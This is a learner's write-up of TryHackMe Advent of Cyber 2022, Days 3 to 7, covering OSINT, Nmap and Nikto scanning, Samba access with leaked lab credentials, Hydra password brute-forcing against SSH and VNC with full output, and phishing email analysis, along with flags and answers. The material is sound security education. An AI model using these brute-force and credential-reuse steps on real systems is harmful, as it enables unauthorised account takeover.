**Robots.txt**
The robots.txt is a publicly accessible file created by the website administrator and intended for search engines to allow or disallow indexing of the website's URLs. All websites have their robots.txt file directly accessible through the domain's main URL. It is a kind of communication mechanism between websites and search engine crawlers. Since the file is publicly accessible, it doesn't mean anyone can edit or modify it. You can access robots.txt by simply appending robots.txt at the end of the website URL. For example, in the case of Google, we can access the robots.txt file by clicking this [URL](https://www.google.com/robots.txt).
We can see that Google has allowed and disallowed specific URLs for web scrapers and search engines. The disallow parameter helps bad actors to identify sensitive directories that can be manually accessed and exploited, like the admin panel, logs folder, etc.
**Breached Database Search**
Major social media and tech giants have suffered data breaches in the past.  As a result, the leaked data is publicly available and, most of the time contains PII like usernames, email addresses, mobile numbers and even passwords. Users may use the same password across all the websites; that enables bad actors to re-use the same password against a user on a different platform for a complete account takeover. Many web services offer to check if your email address or phone number is in a leaked database; [HaveIBeenPwned](https://haveibeenpwned.com/) is one of the free services.
Elf Recon McRed tried to run all email addresses of the Santa gift shop website to identify any leakage, and gladly no data breach was found.
**Searching GitHub Repos**
GitHub is a renowned platform that allows developers to host their code through version control. A developer can create multiple repositories and set the privacy setting as well. A common flaw by developers is that the privacy of the repository is set as public, which means anyone can access it. These repositories contain complete source code and, most of the time, include passwords, access tokens, etc.
McRed, the recon master, searched various terms on GitHub to find something useful like `SantaGiftShop`, `SantaGift`, `SantaShop` etc. Luckily, one of the terms worked, and he found the website's complete source code publicly available through OSINT.
Answer the questions below
What is the name of the Registrar for the domain santagift.shop?
Check the who.is/whois website to find WHOIS information.
https://whois.domaintools.com/santagift.shop
![[Pasted image 20221217232129.png]]
*Namecheap, Inc.*
Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?
Use the same search terms that Recon McRed used on github.com to find the leaked source code.
![[Pasted image 20221217232219.png]]
site:github.com SantaGiftShop
https://github.com/muhammadthm/SantaGiftShop/blob/main/config.php
*{THM_OSINT_WORKS}*
What is the name of the file containing passwords?
*config.php*
What is the name of the QA server associated with the website?
Check the file containing sensitive credentials.
*qa.santagift.shop*
What is the DB_PASSWORD that is being reused between the QA and PROD environments?
*S@nta2022*
Check out this [room](https://tryhackme.com/room/googledorking) if you'd like to learn more about Google Dorking!
The Story
Check out HuskyHack's video walkthrough for Day 4 [here](https://youtu.be/fM9rrKozBxw?t=203)!
﻿During the investigation of the downloaded GitHub repo (OSINT task), elf Recon McRed identified a URL `qa.santagift.shop` that is probably used by all the elves with admin privileges to add or delete gifts on the Santa website. The website has been pulled down for maintenance, and now Recon McRed is scanning the server to see how it's been compromised. Can you help McRed scan the network and find the reason for the website compromise?
**Learning Objectives**
-   What is Scanning?
-   Scanning types
-   Scanning techniques
-   Scanning tools
**What is Scanning**
Scanning is a set of procedures for identifying live hosts, ports, and services, discovering the operating system of the target system, and identifying vulnerabilities and threats in the network. These scans are typically automated and give an insight into what could be exploited. Scanning reveals parts of the attack surface for attackers and allows launching targeted attacks to exploit the system.
**Scanning Types**
Scanning is classified as either active or passive based on the degree of intrusiveness to gathering information about a target system or network, as explained below:
-   **Passive Scanning**: This method involves scanning a network without directly interacting with the target device (server, computer etc.). Passive scanning is usually carried out through packet capture and analysis tools like Wireshark; however, this technique only provides basic asset information like OS version, network protocol etc., against the target.
-   **Active Scanning**: Active scanning is a scanning method whereby you scan individual endpoints in an IT network to retrieve more detailed information. The active scan involves sending packets or queries directly to specific assets rather than passively collecting that data by "catching" it in transit on the network's traffic. Active scanning is an immediate deep scan performed on targets to get detailed information. These targets can be a single endpoint or a network of endpoints.
**Scanning Techniques**
The following standard techniques are employed to scan a target system or network effectively.
**Network Scanning**
A network is usually a collection of interconnected hosts or computers to share information and resources. Network scanning helps to discover and map a complete network, including any live computer or hosts, open ports, IP addresses, and services running on any live host and operating system. Once the network is mapped, an attacker executes exploits as per the target system and services discovered. For example, a computer in a network with an outdated Apache version enables an attacker to launch an exploit against a vulnerable Apache server.
**Port Scanning**
Per Wikipedia, "_In computer networking, a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service. At the software level, within an operating system, a port is a logical construct that identifies a specific process or a type of network service_".
Port scanning is a conventional method to examine open ports in a network capable of receiving and sending data. First, an attacker maps a complete network with installed devices/ hosts like firewalls, routers, servers etc., then scans open ports on each live host. Port number varies between 0 to 65,536 based on the type of service running on the host. Port scanning results fall into the following three categories:
-   **Closed Ports**: The host is not listening to the specific port.
-   **Open Ports**: The host actively accepts a connection on the specific port.
-   **Filtered Ports**: This indicates that the port is open; however, the host is not accepting connections or accepting connections as per certain criteria like specific source IP address.
**Vulnerability Scanning**
The vulnerability scanning proactively identifies the network's vulnerabilities in an automated way that helps determine whether the system may be threatened or exploited. Free and paid tools are available that help to identify loopholes in a target system through a pre-build database of vulnerabilities. Pentesters widely use tools such as [Nessus](https://www.tenable.com/products/nessus) and [Acunetix](https://www.acunetix.com/) to identify loopholes in a system.
**Scanning Tools**
**Network Mapper (Nmap)**
Nmap is a popular tool used to carry out port scanning, discover network protocols, identify running services, and detect operating systems on live hosts. You can learn more about the tool by visiting rooms [Nmap](https://tryhackme.com/room/furthernmap),  [Nmap live host discovery](https://tryhackme.com/room/nmap01), [Nmap basic port scan](https://tryhackme.com/room/nmap02) and [Nmap advanced port scan](https://tryhackme.com/room/nmap03) rooms on TryHackMe.
Deploy the virtual machine by clicking `Start Machine` at the top right of this task. This is the machine Recon McRed wants to scan.
You can access the tools needed by clicking the `Start AttackBox` button above. Wait for the AttackBox to load, and launch the terminal from the Desktop. Type `nmap` in the AttackBox terminal.  A quick summary of important Nmap options is listed below:
-   **TCP SYN Scan**: Get the list of live hosts and associated ports on the hosts without completing the TCP three-way handshake and making the scan a little stealthier. Usage: `nmap -sS MACHINE_IP`.
Terminal
```shell-session
mcred@machine$ nmap -sS MACHINE_IP

Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-08 07:05 GMT
Nmap scan report for ip-10-10-170-119.eu-west-1.compute.internal (10.10.170.119)
Host is up (0.0020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  xxxx
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:B1:18:36:C7:07 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
```
-   **Ping Scan**: Allows scanning the live hosts in the network without going deeper and checking for ports services etc. Usage: `nmap -sn MACHINE_IP`.
-   **Operating System Scan**: Allows scanning of the type of OS running on a live host. Usage: `nmap -O MACHINE_IP`.
-   **Detecting Services**: Get a list of running services on a live host. Usage: `nmap -sV MACHINE_IP`
**Nikto**
Nikto is open-source software that allows scanning websites for vulnerabilities. It enables looking for subdomains, outdated servers, debug messages etc., on a website. You can access it on the AttackBox by typing `nikto -host MACHINE_IP`.
Terminal
```shell-session
mcred@machine$ nikto -host MACHINE_IP:80
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MACHINE_IP
+ Target Hostname:    ip-MACHINE_IP.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2022-11-08 08:34:50 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5eca7b0d75572 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-11-08 08:35:00 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Elf Recon McRed ran Nmap and Nikto tools against the QA server to find the list of open ports and vulnerabilities. He noticed a Samba service running - hackers can gain access to the system through loosely protected Samba share folders that are not protected over the network. He knows that The Bandit Yeti APT got a few lists of admin usernames and passwords for `qa.santagift.shop` using OSINT techniques.
Let's connect to the Samba service using the credentials we found through the source code (OSINT task). Type the following command `smb://MACHINE_IP` in the address bar and use the following username and password:
-   Username: ubuntu
-   Password: S@nta2022
Answer the questions below
What is the name of the HTTP server running on the remote host?
Try nmap -sV MACHINE_IP in the AttackBox.
```text
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.10.108.132       
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 23:26 EST
Nmap scan report for 10.10.108.132
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: IP-10-10-108-132; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.90 seconds
```
*Apache*
What is the name of the service running on port 22 on the QA server?
*ssh*
What flag can you find after successfully accessing the Samba service?
It is located in the admins folder.
![[Pasted image 20221217232819.png]]
![[Pasted image 20221217232850.png]]
![[Pasted image 20221217232906.png]]
![[Pasted image 20221217232932.png]]
*{THM_SANTA_SMB_SERVER}*
What is the password for the username santahr?
![[Pasted image 20221217233010.png]]
*santa25*
If you want to learn more scanning techniques, we have a module dedicated to [Nmap](https://tryhackme.com/module/nmap)!
### [Day 5] Brute-Forcing He knows when you're awake
The Story
Check out Phillip Wylie's video walkthrough for Day 5 [here](https://www.youtube.com/watch?v=oqXG82ESTWw)!
```shell-session
root@AttackBox# nmap -sS MACHINE_IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 11:57 EET
Nmap scan report for MACHINE_IP
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5900/tcp open  vnc

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```
We want an automated way to try the common passwords or the entries from a word list; here comes [THC Hydra](https://github.com/vanhauser-thc/thc-hydra). Hydra supports many protocols, including SSH, VNC, FTP, POP3, IMAP, SMTP, and all methods related to HTTP. You can learn more about THC Hydra by joining the [Hydra](https://tryhackme.com/room/hydra) room. The general command-line syntax is the following:
`hydra -l username -P wordlist.txt server service` where we specify the following options:
-   `-l username`: `-l` should precede the `username`, i.e. the login name of the target. You should omit this option if the service does not use a username.
-   `-P wordlist.txt`: `-P` precedes the `wordlist.txt` file, which contains the list of passwords you want to try with the provided username.
-   `server` is the hostname or IP address of the target server.
-   `service` indicates the service in which you are trying to launch the dictionary attack.
Consider the following concrete examples:
-   `hydra -l mark -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh` will use `mark` as the username as it iterates over the provided passwords against the SSH server.
-   `hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP` is identical to the previous example. `MACHINE_IP ssh` is the same as `ssh://MACHINE_IP`.
You can replace `ssh` with another protocol name, such as `rdp`, `vnc`, `ftp`, `pop3` or any other protocol supported by Hydra.
There are some extra optional arguments that you can add:
-   `-V` or `-vV`, for verbose, makes Hydra show the username and password combinations being tried. This verbosity is very convenient to see the progress, especially if you still need to be more confident in your command-line syntax.
-   `-d`, for debugging, provides more detailed information about what’s happening. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, `-d` will reveal this immediately.
In the terminal window below, we use Hydra to find the password of the username `alexander` that allows access via SSH.
AttackBox Terminal
```shell-session
root@AttackBox# hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-15 13:39:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://MACHINE_IP:22/
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "princess" - 6 of 14344399 [child 5] (0/0)
...
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "poohbear" - 111 of 14344402 [child 1] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "patrick" - 112 of 14344402 [child 2] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "iloveme" - 113 of 14344402 [child 6] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "sakura" - 114 of 14344402 [child 7] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "adrian" - 115 of 14344402 [child 15] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "alexander" - 116 of 14344402 [child 4] (0/3)
[22][ssh] host: MACHINE_IP   login: alexander   password: sakura
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-15 13:41:01
```
You can experiment by repeating the same command `hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP -V` on the AttackBox’s terminal. The password of the username `alexander` was found to be `sakura`, the 114th in the `rockyou.txt` password list. In TryHackMe tasks, we expect any attack to finish within less than five minutes; however, the attack would usually take longer in real-life scenarios. Options for verbosity or debugging can be helpful if you want Hydra to update you about its progress.
### Connecting to a VNC Server
Many clients can be used to connect to a VNC server. If you are connecting from the AttackBox, we recommend using Remmina. To start Remmina, from the Applications menu in the upper right, click on the Internet group to find Remmina.
If you get a dialog box to unlock your login keyring, click Cancel.
We need to select the VNC protocol and type the IP address of the target system, as shown in the figure below.
Answer the questions below
Use Hydra to find the VNC password of the target with IP address `MACHINE_IP`. What is the password?
The VNC server does not use a username.
```text
┌──(kali㉿kali)-[~]
└─$ hydra -s 5900 -P /usr/share/wordlists/rockyou.txt -t 16 10.10.51.185 vnc 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-17 23:33:35
[WARNING] you should set the number of parallel task to 4 for vnc services.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking vnc://10.10.51.185:5900/
[STATUS] 450.00 tries/min, 450 tries in 00:01h, 14343949 to do in 531:16h, 16 active
[5900][vnc] host: 10.10.51.185   password: 1q2w3e4r
[STATUS] attack finished for 10.10.51.185 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-17 23:35:56
```
*1q2w3e4r*
Using a VNC client on the AttackBox, connect to the target of IP address `MACHINE_IP`. What is the flag written on the target’s screen?
You can use Remmina to connect to your target using VNC with the password that you have found.
![[Pasted image 20221217233717.png]]
![[Pasted image 20221217233740.png]]
![[Pasted image 20221217233807.png]]
![[Pasted image 20221217233835.png]]
If you liked the topics presented in this task, check out these rooms next: [Protocols and Servers 2](https://tryhackme.com/room/protocolsandservers2), [Hydra](https://tryhackme.com/room/hydra), [Password Attacks](https://tryhackme.com/room/passwordattacks), [John the Ripper](https://tryhackme.com/room/johntheripper0).
Completed
### [Day 6] Email Analysis It's beginning to look a lot like phishing
The Story
Check out CyberSecMeg's video walkthrough for Day 6 [here](https://www.youtube.com/watch?v=dcGvnZ4JDHI)!
Elf McBlue found an email activity while analysing the log files. It looks like everything started with an email...
Learning Objectives
-   Learn what email analysis is and why it still matters.
-   Learn the email header sections.
-   Learn the essential questions to ask in email analysis.
-   Learn how to use email header sections to evaluate an email.
-   Learn to use additional tools to discover email attachments and conduct further analysis.
-   Help the Elf team investigate the suspicious email received.
What is Email Analysis?
Email analysis is the process of extracting the email header information to expose the email file details. The email header contains the technical details of the email like sender, recipient, path, return address and attachments. Usually, these details are enough to determine if there is something suspicious/abnormal in the email and decide on further actions on the email, like filtering/quarantining or delivering. This process can be done manually and with the help of tools.
There are two main concerns in email analysis.
-   **Security issues:** Identifying suspicious/abnormal/malicious patterns in emails.
-   **Performance issues:** Identifying delivery and delay issues in emails.
In this task, we will focus on security concerns on emails, a.k.a. phishing. Before focusing on the hands-on email analysis, you will need to be familiar with the terms "social engineering" and "phishing".
-   **Social engineering:** Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These "weaknesses" can be curiosity, jealousy, greed, kindness, and willingness to help someone.
-   **Phishing:** Phishing is a sub-section of social engineering delivered through email to trick someone into either revealing personal information and credentials or executing malicious code on their computer.
Phishing emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. You can find more information on phishing by completing the [**phishing module**](https://tryhackme.com/module/phishing).
Does the Email Analysis Still Matter?
Yes! Various academic research and technical reports highlight that phishing attacks are still extremely common, effective and difficult to detect. It is also part of penetration testing and red teaming implementations (paid security assessments that examine organisational cybersecurity). Therefore, email analysis competency is still an important skill to have. Today, various tools and technologies ease and speed up email analysis. Still, a skilled analyst should know how to conduct a manual analysis when there is no budget for automated solutions. It is also a good skill for individuals and non-security/IT people!
Important Note: In-depth analysis requires an isolated environment to work. It is only suggested to download and upload the received emails and attachments if you are in the authorised team and have an isolated environment. Suppose you are outside the corresponding team or a regular user. In that case, you can evaluate the email header using the raw format and conduct the essential checks like the sender, recipient, spam score and server information. Remember that you have to inform the corresponding team afterwards.
How to Analyse Emails?
Before learning how to conduct an email analysis, you need to know the structure of an email header. Let's quickly review the email header structure.
**Field**
**Details**
**From**
The sender's address.
**To**
The receiver's address, including CC and BCC.
**Date**
Timestamp, when the email was **sent.**
**Subject**
The subject of the email.
**Return Path**
The return address of the reply, a.k.a. "Reply-To".
If you reply to an email, the reply will go to the address mentioned in this field.
**Domain Key and DKIM Signatures**
Email signatures are provided by email services to identify and authenticate emails.
**SPF**
Shows the server that was used to send the email.
It will help to understand if the actual server is used to send the email from a specific domain.
**Message-ID**
Unique ID of the email.
**MIME-Version**
Used MIME version.
It will help to understand the delivered "non-text" contents and attachments.
**X-Headers**
The receiver mail providers usually add these fields.
Provided info is usually experimental and can be different according to the mail provider.
**X-Received**
Mail servers that the email went through.
**X-Spam Status**
Spam score of the email.
**X-Mailer**
Email client name.
Important Email Header Fields for Quick Analysis
Analysing multiple header fields can be confusing at first glance, but starting from the key points will make the analysis process slightly easier. A simple process of email analysis is shown below.
**Questions to Ask / Required Checks**
**Evaluation**
Do the "From", "To", and "CC" fields contain valid addresses?
Having invalid addresses is a red flag.
Are the "From" and "To" fields the same?
Having **the same** sender and recipient is a red flag.
Are the "From" and "Return-Path" fields the same?
Having **differen**t values in these sections is a red flag.
Was the email sent from the correct server?
Email should have come from the official mail servers of the sender.
Does the "Message-ID" field exist, and is it valid?
Empty and malformed values are red flags.
Do the hyperlinks redirect to suspicious/abnormal sites?
Suspicious links and redirections are red flags.
Do the attachments consist of or contain malware?
Suspicious attachments are a red flag.
File hashes marked as suspicious/malicious by sandboxes are a red flag.
You'll also need an email header parser tool or configure a text editor to highlight and spot the email header's details easily. The difference between the raw and parsed views of the email header is shown below.
Note: The below example is demonstrated with the tool "Sublime Text". The tool is configured and ready for task usage in the given VM.
You can use Sublime Text to view email files without opening and executing any of the linked attachments/commands. You can view the email file in the text editor using two approaches.
-   Right-click on the sample and open it with Sublime Text.
-   Open Sublime Text and drag & drop the sample into the text editor.
If your file has a **".eml"** or **".msg"** extension, the sublime text will automatically detect the structure and highlight the header fields for ease of readability. Note that if you are using a **".txt"** or any other extension, you will need manually select the highlighting format by using the button located at the lower right corner.
Text editors are helpful in analysis, but there are some tools that can help you to view the email details in a clearer format. In this task, we will use the "emlAnalyzer" tool to view the body of the email and analyse the attachments. The emlAnalyzer is a tool designed to parse email headers for a better view and analysis process. The tool is ready to use in the given VM. The tool can show the headers, body, embedded URLs, plaintext and HTML data, and attachments. The sample usage query is explained below.
**Query Details**
**Explanation**
**emlAnalyzer**
Main command
**-i**
File to analyse
-i /path-to-file/filename
**Note:** Remember, you can either give a full file path or navigate to the required folder using the "cd" command.
**--header**
Show header
**-u**
Show URLs
**--text**
Show cleartext data
**--extract-all**
Extract all attachments
Sample usage is shown below. Now use the given sample and execute the given command.
emlAnalyzer Usage
```shell-session
user@ubuntu$ emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all
 ==============
 ||  Header  ||
 ==============
X-Pm-Content-Encryption.....end-to-end
X-Pm-Origin.................internal
Subject.....................Urgent: Blue section is down. Switch to the load share plan!
From........................[REDACTED]
Date........................[REDACTED]
Mime-Version................[REDACTED]
Content-Type................[REDACTED]
To..........................[REDACTED]
X-Attached..................[REDACTED]
Message-Id..................[REDACTED]
X-Pm-Spamscore..............[REDACTED]
Received....................[REDACTED]
X-Original-To...............[REDACTED]
Return-Path.................[REDACTED]
Delivered-To................[REDACTED]
 =========================
 ||  URLs in HTML part  ||
 =========================
[+] No URLs found in the html
 =================
 ||  Plaintext  ||
 =================
[+] Email contains no plaintext
 ============
 ||  HTML  ||
 ============
Dear Elves,.......
 =============================
 ||  Attachment Extracting  ||
 =============================
[+] Attachment [1] "Division_of_........
```
At this point, you should have completed the following checks.
-   Sender and recipient controls
-   Return path control
-   Email server control
-   Message-ID control
-   Spam value control
-   Attachment control (Does the email contains any attachment?)
Additionally, you can use some Open Source Intelligence (OSINT) tools to check email reputation and enrich the findings. Visit the given site below and do a reputation check on the sender address and the address found in the return path.
-   **Tool:** `https://emailrep.io/`
Here, if you find any suspicious URLs and IP addresses, consider using some OSINT tools for further investigation. While we will focus on using Virustotal and InQuest, having similar and alternative services in the analyst toolbox is worthwhile and advantageous.
**Tool**
**Purpose**
**VirusTotal**
A service that provides a cloud-based detection toolset and sandbox environment.
**InQuest**
A service provides network and file analysis by using threat analytics.
**IPinfo.io**
A service that provides detailed information about an IP address by focusing on geolocation data and service provider.
**Talos Reputation**
An IP reputation check service is provided by Cisco Talos.
**Urlscan.io**
A service that analyses websites by simulating regular user behaviour.
**Browserling**
A browser sandbox is used to test suspicious/malicious links.
**Wannabrowser**
A browser sandbox is used to test suspicious/malicious links.
After completing the mentioned initial checks, you can continue with body and attachment analysis. Now, let's focus on analysing the email body and attachments. The sample doesn't have URLs, only an attachment. You need to compute the value of the file to conduct file-based reputation checks and further your analysis. As shown below, you can use the sha256sum tool/utility to calculate the file's hash value.
**Note:** Remember to navigate to the file's location before attempting to calculate the file's hash value.
emlAnalyzer Usage
```shell-session
user@ubuntu$ sha256sum Division_of....
0827bb9a....
```
-   Tool: `https://www.virustotal.com/gui/home/upload`
Now, visit the tool website and use the `SEARCH` option to conduct hash-based file reputation analysis. After receiving the results, you will have multiple sections to discover more about the hash and associated file. Sections are shown below.
-   Search the hash value
-   Click on the `BEHAVIOR` tab.
-   Analyse the details.
After that, continue on reputation check on **InQuest** to enrich the gathered data.
-   **Tool:** `https://labs.inquest.net/`
Now visit the tool website and use the `INDICATOR LOOKUP` option to conduct hash-based analysis.
-   Search the hash value
-   Click on the SHA256 hash value highlighted with yellow to view the detailed report.
-   Analyse the file details.
After finishing the shown steps, you are finished with the initial email analysis. The next steps are creating a report of findings and informing the team members/manager in the appropriate format.
Now is the time to put what we've learned into practice. Click on the Start Machine button at the top of the task to launch the Virtual Machine. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. Now, back to elf McSkidy analysing the suspicious email that might have helped the Bandit Yeti infiltrate Santa's network.
**IMPORTANT NOTES:**
-   **Given email sample contains a malicious attachment.**
-   **Never directly interact with unknown email attachments outside of an isolated environment.**
Answer the questions below
What is the email address of the sender?
```text
ubuntu@ip-10-10-31-230:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  snap
ubuntu@ip-10-10-31-230:~$ cd Desktop/
ubuntu@ip-10-10-31-230:~/Desktop$ ls
Urgent:.eml  mate-terminal.desktop  sublime-text_subl.desktop
ubuntu@ip-10-10-31-230:~/Desktop$ emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all
 ==============
 ||  Header  ||
 ==============
X-Pm-Content-Encryption.....end-to-end
X-Pm-Origin.................internal
Subject.....................Urgent: Blue section is down. Switch to the load share plan!
From........................Chief Elf <chief.elf@santaclaus.thm>
Date........................Tue, 6 Dec 2022 00:00:01 +0000
Mime-Version................1.0
Content-Type................multipart/mixed;boundary=---------------------03edd9c682a0c8f60d54b9e4bb86659f
To..........................elves.all@santaclaus.thm <elves.all@santaclaus.thm>
X-Attached..................Division_of_labour-Load_share_plan.doc
Message-Id..................<QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==>
X-Pm-Spamscore..............3
Received....................from mail.santaclaus.thm by mail.santaclaus.thm; Tue, 6 Dec 2022 00:00:01 +0000
X-Original-To...............elves.all@santaclaus.thm
Return-Path.................<murphy.evident@bandityeti.thm>
Delivered-To................elves.all@santaclaus.thm

 =========================
 ||  URLs in HTML part  ||
 =========================
[+] No URLs found in the html

 =================
 ||  Plaintext  ||
 =================
[+] Email contains no plaintext

 ============
 ||  HTML  ||
 ============
<span>Dear Elves,</span><div><br></div><div><span>Due to technical problems in the blue section of our toy factory, we are having difficulties preparing some toys. </span></div><div><br></div><div><span>There
 are a few days left to Christmas, so we need to use time efficiently to
 prepare every wishlist we receive. Due to that, the blue section's 
workload is shared with the rest to avoid any toy production delay.</span></div><div><br></div><div><span>The detailed division of labour is included in the attached document.</span></div><div><br></div><div><span>Good luck to you all.</span></div><div><br></div><div><b><span>Chief Elf</span></b></div><div><br></div>

 =============================
 ||  Attachment Extracting  ||
 =============================
[+] Attachment [1] "Division_of_labour-Load_share_plan.doc" extracted to eml_attachments/Division_of_labour-Load_share_plan.doc
```
*chief.elf@santaclaus.thm*
What is the return address?
*murphy.evident@bandityeti.thm*
On whose behalf was the email sent?
*Chief Elf*
What is the X-spam score?
*3*
What is hidden in the value of the Message-ID field?
Message-ID values are usually not in BASE64 format. If you saw so, decode the value to understand what's hidden there.
```text
┌──(kali㉿kali)-[~]
└─$ echo 'QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==' | base64 -d
AoC2022_Email_Analysis
```
*AoC2022_Email_Analysis*
Visit the email reputation check website provided in the task.
What is the reputation result of the sender's email address?
https://emailrep.io/
![[Pasted image 20221217235705.png]]
**
Check the attachments.
What is the filename of the attachment?
*Division_of_labour-Load_share_plan.doc*
What is the hash value of the attachment?
```text
ubuntu@ip-10-10-31-230:~/Desktop$ ls
Urgent:.eml  eml_attachments  mate-terminal.desktop  sublime-text_subl.desktop
ubuntu@ip-10-10-31-230:~/Desktop$ cd eml_attachments/
ubuntu@ip-10-10-31-230:~/Desktop/eml_attachments$ ls
Division_of_labour-Load_share_plan.doc
ubuntu@ip-10-10-31-230:~/Desktop/eml_attachments$ sha256sum Division_of_labour-Load_share_plan.doc 
0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467  Division_of_labour-Load_share_plan.doc
```
*0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467*
Visit the Virus Total website and use the hash value to search.
Navigate to the behaviour section.
What is the second tactic marked in the Mitre ATT&CK section?
https://www.virustotal.com/gui/file/0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467/behavior
![[Pasted image 20221217235948.png]]
*Defense Evasion*
Visit the InQuest website and use the hash value to search.
What is the subcategory of the file?
https://labs.inquest.net/dfi/sha256/0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467
![[Pasted image 20221217235840.png]]
*macro_hunter*
If you want to learn more about phishing and analysing emails, check out the [Phishing](https://tryhackme.com/module/phishing) module!
### [Day 7] CyberChef Maldocs roasting on an open fire
The Story
Check out SecurityNinja's video walkthrough for Day 7 [here](https://www.youtube.com/watch?v=W4dZW5s2CeA)!
In the previous task, we learned that McSkidy was indeed a victim of a spearphishing campaign that also contained a suspicious-looking document `Division_of_labour-Load_share_plan.doc`. McSkidy accidentally opened the document, and it's still unknown what this document did in the background. McSkidy has called on the in-house expert **Forensic McBlue** to examine the malicious document and find the domains it redirects to. Malicious documents may contain a suspicious command to get executed when opened, an embedded malware as a dropper (malware installer component), or may have some C2 domains to connect to.
-   What is CyberChef
-   What are the capabilities of CyberChef
-   How to leverage CyberChef to analyze a malicious document
-   How to deobfuscate, filter and parse the data
Lab Deployment
For today's task, you will need to deploy the machine attached to this task by pressing the green "**Start Machine**" button located at the top-right of this task. The machine should launch in a split-screen view. If it does not, you will need to press the blue "Show Split View" button near the top-right of this page.
CyberChef Overview
CyberChef is a web-based application - used to slice, dice, encode, decode, parse and analyze data or files. The CyberChef layout is explained below. An offline version of cyberChef is bookmarked in Firefox on the machine attached to this task.
1.  Add the text or file in panel 1.
2.  Panel 2 contains various functions, also known as recipes that we use to encode, decode, parse, search or filter the data.
3.  Drag the functions or recipes from Panel 2 into Panel 3 to create a recipe.
4.  The output from the recipes is shown in panel 4.
